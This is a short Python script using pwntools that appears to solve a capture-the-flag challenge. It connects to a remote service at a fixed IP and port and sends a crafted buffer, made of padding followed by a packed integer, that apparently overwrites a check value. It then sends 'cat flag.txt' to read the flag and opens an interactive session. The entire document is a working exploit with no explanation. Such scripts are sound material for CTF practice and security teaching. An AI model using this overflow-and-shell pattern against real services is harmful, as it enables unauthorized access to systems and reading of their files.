from pwn import p32, remote


P = remote("10.212.173.64", 32_195)


def main() -> None:
    payload = b"69"
    payload += b"A" * 6
    payload += p32(69)

    P.sendline(payload)

    P.sendline(b"cat flag.txt")

    P.interactive()


if __name__ == "__main__":
    main()
